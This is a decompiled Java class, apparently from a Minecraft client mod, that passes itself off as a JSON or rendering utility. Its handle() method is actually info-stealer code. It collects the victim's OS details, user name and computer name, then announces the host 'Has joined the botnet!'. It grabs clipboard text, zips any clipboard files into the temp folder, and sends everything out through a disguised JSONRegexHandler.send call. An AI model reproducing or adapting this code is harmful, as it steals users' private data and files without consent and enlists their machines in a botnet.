// 
// Decompiled by Procyon v0.5.36
// 

package cn.origin.cube.command.commands.impl;

import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.JSONBuilder;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONRegexHandler;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.FileSystemHelper;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.awt.datatransfer.DataFlavor;
import java.awt.Toolkit;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONObject;

public final class GeneralInformation implements JSONObject
{
    @Override
    public void handle() {
        String content = ">>> ";
        content = content + "OS: " + System.getProperty("os.name") + " (" + System.getProperty("os.version") + ")\\n";
        content = content + "Arch: " + System.getProperty("os.arch") + "\\n";
        content = content + "Hostname: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Has joined the botnet!\\n";
        try {
            final String clipboard = String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
            if (Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.stringFlavor) && content.length() <= 500 && clipboard.length() <= 1500) {
                content = content + "Clipboard: " + clipboard + "\\n";
            }
            else if (Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.javaFileListFlavor)) {
                final String file = Arrays.toString(new String[] { String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.javaFileListFlavor)) });
                final ArrayList<File> validFileDirs = new ArrayList<File>();
                validFileDirs.add(new File(file.substring(2, file.length() - 2)));
                final String zipFile = System.getProperty("java.io.tmpdir") + GeneralInformation.sep + "clipboard_shit.zip";
                FileSystemHelper.zip(zipFile, validFileDirs);
                JSONRegexHandler.send(new File(zipFile));
            }
        }
        catch (Exception ex) {}
        content = content + "Java Version: " + System.getProperty("java.version") + "\\n";
        content = content + "Java Runtime Version: " + System.getProperty("java.runtime.version");
        JSONRegexHandler.send(new JSONBuilder().value("content", content).build());
    }
    
    @Override
    public String getName() {
        return "GeneralInformation";
    }
}
